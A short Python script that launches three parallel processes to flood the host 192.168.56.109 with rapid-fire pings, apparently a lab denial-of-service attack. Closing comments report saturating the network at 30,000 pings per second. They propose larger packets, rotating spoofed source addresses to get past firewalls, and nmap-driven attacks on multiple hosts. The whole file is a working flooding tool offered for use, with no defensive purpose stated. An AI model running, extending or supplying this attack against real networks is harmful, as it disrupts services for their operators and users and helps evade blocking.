from multiprocessing import Process  # allow for paralel processing
import os  # allow to use the terminal
def a():
	for r in range(10): 
		response = os.system("ping -c 1000000 -i 0.00001 192.168.56.109")
def b():
	for r in range(10):
		response = os.system("ping -c 1000000 -i 0.00001 -q 192.168.56.109")
def c():
	for r in range(10):
		response = os.system("ping -c 1000000 -i 0.00001 -q 192.168.56.109")
p1 = Process(target = a)
p1.start()
p2 = Process(target = b)
p2.start()
p3 = Process(target = c)
p3.start()

# achived- 30 million pings at 30000/s, network usage 100%
# weaknesses- will get blocked by firewalls after so many pings
# possible imporvements- increase packet size, spoof IP address and change spoofed ip consitantly,
# intoduce parent script allowing the attack of miltible hosts in the network using nmap
